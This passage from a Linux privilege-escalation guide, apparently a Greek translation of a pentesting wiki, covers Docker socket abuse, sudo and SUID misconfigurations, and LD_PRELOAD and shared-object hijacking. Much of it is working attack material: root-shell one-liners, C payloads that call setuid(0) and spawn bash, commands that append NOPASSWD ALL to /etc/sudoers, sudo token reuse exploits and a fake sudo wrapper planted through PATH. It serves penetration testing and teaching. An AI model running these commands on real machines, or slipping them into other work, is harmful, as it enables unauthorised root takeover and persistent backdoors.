If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\ _Σημειώστε ότι το σύστημα πρέπει να χρησιμοποιεί αυτή τη ρύθμιση του socket αρχείου αλλιώς το backdoor δεν θα εκτελεστεί_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Ακατέργαστη σύνδεση
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Παράδειγμα Exploitation:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Σημειώστε ότι μπορεί να υπάρχουν μερικά **sockets που ακούνε για HTTP** αιτήματα (_Δεν αναφέρομαι στα .socket files αλλά στα αρχεία που λειτουργούν ως unix sockets_). Μπορείτε να το ελέγξετε με:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Εάν το socket **responds with an HTTP** request, τότε μπορείτε να **communicate** με αυτό και ίσως **exploit some vulnerability**.

### Εγγράψιμο Docker Socket

Το Docker socket, που συχνά βρίσκεται στο `/var/run/docker.sock`, είναι ένα κρίσιμο αρχείο που πρέπει να ασφαλιστεί. Εξ ορισμού, είναι εγγράψιμο από τον χρήστη `root` και τα μέλη της ομάδας `docker`. Η κατοχή write access σε αυτό το socket μπορεί να οδηγήσει σε privilege escalation. Ακολουθεί ανάλυση του πώς μπορεί να γίνει αυτό και εναλλακτικές μέθοδοι εάν το Docker CLI δεν είναι διαθέσιμο.

#### **Privilege Escalation with Docker CLI**

Εάν έχετε write access στο Docker socket, μπορείτε να escalate privileges χρησιμοποιώντας τις παρακάτω εντολές:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Χρήση Docker API απευθείας**

Σε περιπτώσεις όπου το Docker CLI δεν είναι διαθέσιμο, το docker socket μπορεί να χειριστείται μέσω του Docker API και εντολών `curl`.

1.  **List Docker Images:** Ανάκτηση της λίστας των διαθέσιμων images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Αποστολή αιτήματος για δημιουργία container που κάνει mount το root directory του host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Χρησιμοποιήστε `socat` για να δημιουργήσετε μια σύνδεση στο container, επιτρέποντας την εκτέλεση εντολών εντός αυτού.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Αφού στήσετε τη σύνδεση `socat`, μπορείτε να εκτελείτε εντολές απευθείας στο container με root-level access στο filesystem του host.

### Άλλα

Σημειώστε ότι εάν έχετε δικαιώματα εγγραφής στο docker socket επειδή βρίσκεστε **inside the group `docker`** έχετε [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Εάν το [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Ελέγξτε **περισσότερους τρόπους για να βγείτε από docker ή να το καταχραστείτε για να escalate privileges** στο:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`ctr`** διαβάστε την ακόλουθη σελίδα καθώς **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`runc`** διαβάστε την ακόλουθη σελίδα καθώς **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus είναι ένα σύνθετο inter-Process Communication (IPC) system που επιτρέπει στις εφαρμογές να αλληλεπιδρούν και να μοιράζονται δεδομένα αποτελεσματικά. Σχεδιασμένο με γνώμονα το σύγχρονο Linux σύστημα, παρέχει ένα στιβαρό πλαίσιο για διαφορετικές μορφές επικοινωνίας μεταξύ εφαρμογών.

Το σύστημα είναι ευέλικτο, υποστηρίζοντας βασικό IPC που βελτιώνει την ανταλλαγή δεδομένων μεταξύ διεργασιών, παρομοιάζοντας με enhanced UNIX domain sockets. Επιπλέον, βοηθά στη μετάδοση γεγονότων ή σημάτων, διευκολύνοντας τη στενή ενσωμάτωση μεταξύ στοιχείων του συστήματος. Για παράδειγμα, ένα signal από ένα Bluetooth daemon για εισερχόμενη κλήση μπορεί να οδηγήσει έναν music player να κάνε mute, βελτιώνοντας την εμπειρία χρήστη. Επιπρόσθετα, το D-Bus υποστηρίζει ένα remote object system, απλοποιώντας αιτήματα υπηρεσιών και κλήσεις μεθόδων μεταξύ εφαρμογών, καθιστώντας διαδικασίες που παραδοσιακά ήταν περίπλοκες πιο απλές.

Το D-Bus λειτουργεί με ένα **allow/deny model**, διαχειριζόμενο δικαιώματα μηνυμάτων (method calls, signal emissions, κ.λπ.) βάσει του συνολικού αποτελέσματος των κανόνων πολιτικής που ταιριάζουν. Αυτές οι πολιτικές καθορίζουν τις αλληλεπιδράσεις με το bus, και ενδέχεται να επιτρέπουν privilege escalation μέσω εκμετάλλευσης αυτών των δικαιωμάτων.

Παρατίθεται ένα παράδειγμα τέτοιας πολιτικής στο `/etc/dbus-1/system.d/wpa_supplicant.conf`, το οποίο περιγράφει δικαιώματα για τον χρήστη root να είναι owner, να στέλνει και να λαμβάνει μηνύματα από το `fi.w1.wpa_supplicant1`.

Οι πολιτικές χωρίς καθορισμένο user ή group εφαρμόζονται καθολικά, ενώ οι πολιτικές του "default" context εφαρμόζονται σε όλους όσους δεν καλύπτονται από άλλες συγκεκριμένες πολιτικές.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Μάθετε πώς να enumerate και exploit μια D-Bus επικοινωνία εδώ:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Δίκτυο**

Είναι πάντα ενδιαφέρον να enumerate το δίκτυο και να προσδιορίσετε τη θέση της μηχανής.

### Γενική enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Πάντα ελέγξτε τα network services που τρέχουν στη μηχανή με τα οποία δεν μπορέσατε να αλληλεπιδράσετε πριν αποκτήσετε πρόσβαση:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Ελέγξτε αν μπορείτε να sniff traffic. Αν μπορείτε, ίσως καταφέρετε να αποκτήσετε μερικά credentials.
```
timeout 1 tcpdump
```
## Χρήστες

### Γενική Καταγραφή

Ελέγξτε **ποιος** είστε, ποιες **privileges** έχετε, ποιοι **users** υπάρχουν στο σύστημα, ποιοι μπορούν να **login** και ποιοι έχουν **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Μεγάλο UID

Ορισμένες εκδόσεις του Linux επηρεάστηκαν από ένα bug που επιτρέπει σε χρήστες με **UID > INT_MAX** να αποκτήσουν αυξημένα προνόμια. Περισσότερες πληροφορίες: [εδώ](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [εδώ](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) και [εδώ](https://twitter.com/paragonsec/status/1071152249529884674).\
**Εκμεταλλευτείτε το με:** **`systemd-run -t /bin/bash`**

### Ομάδες

Ελέγξτε αν είστε **μέλος κάποιας ομάδας** που θα μπορούσε να σας δώσει προνόμια root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Πρόχειρο

Ελέγξτε αν υπάρχει κάτι ενδιαφέρον στο πρόχειρο (αν είναι δυνατόν)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Πολιτική κωδικών πρόσβασης
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Γνωστοί κωδικοί πρόσβασης

Εάν **γνωρίζετε κάποιον κωδικό** του περιβάλλοντος **δοκιμάστε να συνδεθείτε ως κάθε χρήστης** χρησιμοποιώντας τον κωδικό.

### Su Brute

Αν δεν σας πειράζει να δημιουργήσετε πολύ θόρυβο και τα binaries `su` και `timeout` υπάρχουν στον υπολογιστή, μπορείτε να δοκιμάσετε να brute-force χρήστη χρησιμοποιώντας [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) με την παράμετρο `-a` προσπαθεί επίσης να κάνει brute-force σε χρήστες.

## Καταχρήσεις του Writable PATH

### $PATH

Αν βρείτε ότι μπορείτε να **γράψετε σε κάποιο φάκελο του $PATH** ίσως να μπορείτε να αποκτήσετε αυξημένα προνόμια δημιουργώντας ένα backdoor μέσα στον εγγράψιμο φάκελο με το όνομα κάποιας command που πρόκειται να εκτελεστεί από διαφορετικό χρήστη (ιδανικά root) και που **δεν φορτώνεται από ένα φάκελο που βρίσκεται πριν** από τον εγγράψιμο φάκελο στο $PATH.

### SUDO and SUID

Μπορεί να σας επιτρέπεται να εκτελέσετε κάποια εντολή χρησιμοποιώντας sudo ή κάποια δυαδικά να έχουν το suid bit. Ελέγξτε το χρησιμοποιώντας:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Κάποιες **απρόσμενες commands επιτρέπουν να διαβάσετε και/ή να γράψετε αρχεία ή ακόμα και να εκτελέσετε μια command.** Για παράδειγμα:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Η ρύθμιση του sudo μπορεί να επιτρέπει σε έναν χρήστη να εκτελεί κάποια εντολή με τα προνόμια άλλου χρήστη χωρίς να γνωρίζει τον κωδικό πρόσβασης.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Σε αυτό το παράδειγμα ο χρήστης `demo` μπορεί να εκτελέσει το `vim` ως `root`, οπότε είναι πλέον εύκολο να αποκτήσει κανείς ένα shell προσθέτοντας ένα ssh key στον κατάλογο του `root` ή καλώντας το `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Αυτή η οδηγία επιτρέπει στον χρήστη να **ορίσει μια μεταβλητή περιβάλλοντος** κατά την εκτέλεση μιας εντολής:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Αυτό το παράδειγμα, **βασισμένο στο HTB machine Admirer**, ήταν **ευάλωτο** σε **PYTHONPATH hijacking** για να φορτώσει μια αυθαίρετη python library ενώ το script εκτελούνταν ως root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

Εάν το sudoers διατηρεί το `BASH_ENV` (π.χ., `Defaults env_keep+="ENV BASH_ENV"`), μπορείτε να εκμεταλλευτείτε τη μη-διαδραστική συμπεριφορά εκκίνησης του Bash για να εκτελέσετε αυθαίρετο κώδικα ως root όταν καλείτε μια επιτρεπόμενη εντολή.

- Why it works: Για non-interactive shells, το Bash αξιολογεί το `$BASH_ENV` και κάνει source το αρχείο αυτό πριν τρέξει το target script. Πολλοί κανόνες sudo επιτρέπουν την εκτέλεση ενός script ή ενός shell wrapper. Αν το `BASH_ENV` διατηρείται από το sudo, το αρχείο σας γίνεται source με προνόμια root.

- Requirements:
- Ένας κανόνας sudo που μπορείτε να τρέξετε (οποιοδήποτε target που καλεί `/bin/bash` non-interactively, ή οποιοδήποτε bash script).
- Το `BASH_ENV` παρόν στο `env_keep` (έλεγχος με `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Σκληροποίηση:
- Αφαιρέστε `BASH_ENV` (και `ENV`) από `env_keep`, προτιμήστε `env_reset`.
- Αποφύγετε shell wrappers για εντολές που επιτρέπονται από sudo· χρησιμοποιήστε minimal binaries.
- Σκεφτείτε sudo I/O logging και alerting όταν χρησιμοποιούνται preserved env vars.

### Παρακάμπτοντας μονοπάτια εκτέλεσης του sudo

**Jump** για να διαβάσετε άλλα αρχεία ή χρησιμοποιήστε **symlinks**. Για παράδειγμα στο αρχείο sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Αν χρησιμοποιηθεί ένα **wildcard** (\*), γίνεται ακόμα πιο εύκολο:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Μέτρα αντιμετώπισης**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary χωρίς καθορισμένη διαδρομή εντολής

Αν η **άδεια sudo** δίνεται σε μια μεμονωμένη εντολή **χωρίς να καθορίζεται η διαδρομή**: _hacker10 ALL= (root) less_, μπορείτε να το εκμεταλλευτείτε αλλάζοντας τη μεταβλητή PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Αυτή η τεχνική μπορεί επίσης να χρησιμοποιηθεί αν ένα **suid** binary **εκτελεί άλλη εντολή χωρίς να καθορίζει τη διαδρομή προς αυτήν (έλεγξε πάντα με** _**strings**_ **το περιεχόμενο ενός περίεργου SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary με διαδρομή εντολής

Εάν το **suid** binary **εκτελεί άλλη εντολή καθορίζοντας τη διαδρομή**, τότε μπορείς να προσπαθήσεις να **export a function** με το όνομα της εντολής που καλεί το suid αρχείο.

Για παράδειγμα, αν ένα suid binary καλεί _**/usr/sbin/service apache2 start**_, πρέπει να προσπαθήσεις να δημιουργήσεις τη συνάρτηση και να την export-άσεις:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Στη συνέχεια, όταν καλέσετε το suid binary, αυτή η συνάρτηση θα εκτελεστεί

### LD_PRELOAD & **LD_LIBRARY_PATH**

Η μεταβλητή περιβάλλοντος **LD_PRELOAD** χρησιμοποιείται για να καθορίσει μία ή περισσότερες shared libraries (.so αρχεία) που θα φορτωθούν από τον loader πριν από όλες τις άλλες, συμπεριλαμβανομένης της standard C library (`libc.so`). Αυτή η διαδικασία είναι γνωστή ως προφόρτωση (preloading) μιας βιβλιοθήκης.

Ωστόσο, για να διατηρηθεί η ασφάλεια του συστήματος και να αποτραπεί η εκμετάλλευση αυτής της δυνατότητας, ειδικά σε **suid/sgid** executables, το σύστημα επιβάλλει ορισμένες προϋποθέσεις:

- Ο loader αγνοεί **LD_PRELOAD** για executables όπου το real user ID (_ruid_) δεν ταιριάζει με το effective user ID (_euid_).
- Για executables με suid/sgid, μόνο βιβλιοθήκες σε standard paths που είναι επίσης suid/sgid προφορτώνονται.

Μπορεί να συμβεί privilege escalation αν έχετε τη δυνατότητα να εκτελείτε εντολές με `sudo` και η έξοδος του `sudo -l` περιλαμβάνει τη δήλωση **env_keep+=LD_PRELOAD**. Αυτή η ρύθμιση επιτρέπει στη μεταβλητή περιβάλλοντος **LD_PRELOAD** να διατηρείται και να αναγνωρίζεται ακόμη και όταν οι εντολές τρέχουν με `sudo`, πιθανώς οδηγώντας στην εκτέλεση αυθαίρετου κώδικα με ανεβασμένα προνόμια.
```
Defaults        env_keep += LD_PRELOAD
```
Αποθήκευση ως **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Στη συνέχεια **compile it** χρησιμοποιώντας:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Τέλος, **escalate privileges** εκτελώντας
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Μια παρόμοια privesc μπορεί να εκμεταλλευτεί εάν ο επιτιθέμενος ελέγχει την **LD_LIBRARY_PATH** env variable, επειδή ελέγχει τη διαδρομή όπου θα αναζητηθούν οι βιβλιοθήκες.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Όταν αντιμετωπίζετε ένα binary με δικαιώματα **SUID** που φαίνεται ασυνήθιστο, είναι καλή πρακτική να ελέγξετε αν φορτώνει σωστά αρχεία **.so**. Αυτό μπορεί να επαληθευτεί τρέχοντας την ακόλουθη εντολή:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Για παράδειγμα, η εμφάνιση ενός σφάλματος όπως _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ υποδηλώνει πιθανή δυνατότητα για exploitation.

Για να το exploit αυτό, κάποιος θα προχωρούσε δημιουργώντας ένα αρχείο C, π.χ. _"/path/to/.config/libcalc.c"_, που περιέχει τον ακόλουθο κώδικα:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Αυτός ο κώδικας, μόλις μεταγλωττιστεί και εκτελεστεί, στοχεύει στην ανύψωση προνομίων χειραγωγώντας τα δικαιώματα αρχείων και εκτελώντας ένα shell με αυξημένα προνόμια.

Μεταγλωττίστε το παραπάνω C αρχείο σε shared object (.so) αρχείο με:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Τέλος, η εκτέλεση του επηρεασμένου SUID binary θα πρέπει να ενεργοποιήσει το exploit, επιτρέποντας πιθανή παραβίαση του συστήματος.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Τώρα που έχουμε βρει ένα SUID binary που φορτώνει μια βιβλιοθήκη από έναν φάκελο όπου μπορούμε να γράψουμε, ας δημιουργήσουμε τη βιβλιοθήκη σε αυτόν τον φάκελο με το απαραίτητο όνομα:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Εάν λάβετε ένα σφάλμα όπως
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
αυτό σημαίνει ότι η βιβλιοθήκη που έχετε δημιουργήσει πρέπει να έχει μια συνάρτηση με όνομα `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) είναι μια επιμελημένη λίστα από Unix binaries που μπορούν να αξιοποιηθούν από έναν επιτιθέμενο για να παρακάμψουν τοπικούς περιορισμούς ασφαλείας. [**GTFOArgs**](https://gtfoargs.github.io/) είναι το ίδιο αλλά για περιπτώσεις όπου μπορείτε **μόνο να εισάγετε ορίσματα** σε μια εντολή.

Το project συγκεντρώνει νόμιμες λειτουργίες των Unix binaries που μπορούν να καταχραστούν για να εξέλθουν από περιορισμένα shells, να αυξήσουν ή να διατηρήσουν αυξημένα privileges, να μεταφέρουν αρχεία, να δημιουργήσουν bind και reverse shells, και να διευκολύνουν άλλες post-exploitation εργασίες.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Αν μπορείτε να εκτελέσετε `sudo -l` μπορείτε να χρησιμοποιήσετε το εργαλείο [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) για να ελέγξετε αν βρίσκει πώς να εκμεταλλευτεί οποιονδήποτε κανόνα sudo.

### Reusing Sudo Tokens

Σε περιπτώσεις όπου έχετε **sudo access** αλλά όχι τον κωδικό, μπορείτε να αυξήσετε τα privileges περιμένοντας την εκτέλεση μιας εντολής sudo και στη συνέχεια αρπάζοντας το session token.

Requirements to escalate privileges:

- Έχετε ήδη ένα shell ως χρήστης "_sampleuser_"
- "_sampleuser_" έχει **χρησιμοποιήσει `sudo`** για να εκτελέσει κάτι στα **τελευταία 15mins** (από προεπιλογή αυτή είναι η διάρκεια του sudo token που μας επιτρέπει να χρησιμοποιήσουμε `sudo` χωρίς να εισάγουμε οποιονδήποτε κωδικό)
- `cat /proc/sys/kernel/yama/ptrace_scope` πρέπει να είναι 0
- `gdb` είναι προσβάσιμο (μπορείτε να το ανεβάσετε)

(Μπορείτε προσωρινά να ενεργοποιήσετε `ptrace_scope` με `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ή μόνιμα τροποποιώντας `/etc/sysctl.d/10-ptrace.conf` και θέτοντας `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Το **δεύτερο exploit** (`exploit_v2.sh`) θα δημιουργήσει ένα sh shell στο _/tmp_ **που ανήκει στον root με setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Το **τρίτο exploit** (`exploit_v3.sh`) θα **δημιουργήσει ένα sudoers αρχείο** που θα κάνει **τα sudo tokens αιώνια και θα επιτρέπει σε όλους τους χρήστες να χρησιμοποιούν sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Εάν έχετε **δικαιώματα εγγραφής** στο φάκελο ή σε κάποιο από τα αρχεία που δημιουργήθηκαν μέσα σε αυτόν μπορείτε να χρησιμοποιήσετε το binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) για να **δημιουργήσετε ένα sudo token για έναν χρήστη και PID**.\
Για παράδειγμα, αν μπορείτε να αντικαταστήσετε το αρχείο _/var/run/sudo/ts/sampleuser_ και έχετε ένα shell με PID 1234 που τρέχει ως ο εν λόγω χρήστης, μπορείτε να **αποκτήσετε sudo privileges** χωρίς να χρειάζεται να γνωρίζετε τον κωδικό κάνοντας:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Το αρχείο `/etc/sudoers` και τα αρχεία μέσα στο `/etc/sudoers.d` καθορίζουν ποιος μπορεί να χρησιμοποιήσει το `sudo` και πώς. Αυτά τα αρχεία **εξ ορισμού μπορούν να διαβαστούν μόνο από τον χρήστη root και την ομάδα root**.\
**Αν** μπορείτε να **διαβάσετε** αυτό το αρχείο, μπορεί να είστε σε θέση να **αποκτήσετε κάποιες ενδιαφέρουσες πληροφορίες**, και αν μπορείτε να **γράψετε** οποιοδήποτε αρχείο θα μπορείτε να **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Αν μπορείς να γράψεις, μπορείς να καταχραστείς αυτή την άδεια
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ένας άλλος τρόπος για να καταχραστείτε αυτά τα δικαιώματα:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Υπάρχουν μερικές εναλλακτικές στο δυαδικό `sudo`, όπως το `doas` για OpenBSD — να θυμάστε να ελέγξετε τη διαμόρφωσή του στο `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Αν γνωρίζετε ότι ένας **χρήστης συνήθως συνδέεται σε μια μηχανή και χρησιμοποιεί `sudo`** για να κερδίσει προνόμια και έχετε ένα shell στο περιβάλλον του χρήστη, μπορείτε να **δημιουργήσετε ένα νέο εκτελέσιμο sudo** που θα εκτελέσει τον κώδικά σας ως root και στη συνέχεια την εντολή του χρήστη. Έπειτα, **τροποποιήστε το $PATH** του περιβάλλοντος χρήστη (για παράδειγμα προσθέτοντας τη νέα διαδρομή στο .bash_profile) ώστε όταν ο χρήστης εκτελεί sudo, το εκτελέσιμο sudo σας να εκτελείται.

Σημειώστε ότι αν ο χρήστης χρησιμοποιεί διαφορετικό shell (όχι bash) θα χρειαστεί να τροποποιήσετε άλλα αρχεία για να προσθέσετε τη νέα διαδρομή. Για παράδειγμα[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) τροποποιεί `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Μπορείτε να βρείτε άλλο ένα παράδειγμα στο [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ή τρέχοντας κάτι σαν:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Κοινή Βιβλιοθήκη

### ld.so

Το αρχείο `/etc/ld.so.conf` υποδεικνύει **από πού προέρχονται τα αρχεία ρυθμίσεων που φορτώνονται**. Συνήθως, αυτό το αρχείο περιέχει την εξής διαδρομή: `include /etc/ld.so.conf.d/*.conf`

Αυτό σημαίνει ότι τα αρχεία ρυθμίσεων από `/etc/ld.so.conf.d/*.conf` θα διαβαστούν. Αυτά τα αρχεία ρυθμίσεων **δείχνουν σε άλλους φακέλους** όπου θα **αναζητηθούν** οι **βιβλιοθήκες**. Για παράδειγμα, το περιεχόμενο του `/etc/ld.so.conf.d/libc.conf` είναι `/usr/local/lib`. **Αυτό σημαίνει ότι το σύστημα θα αναζητήσει βιβλιοθήκες μέσα στο `/usr/local/lib`**.

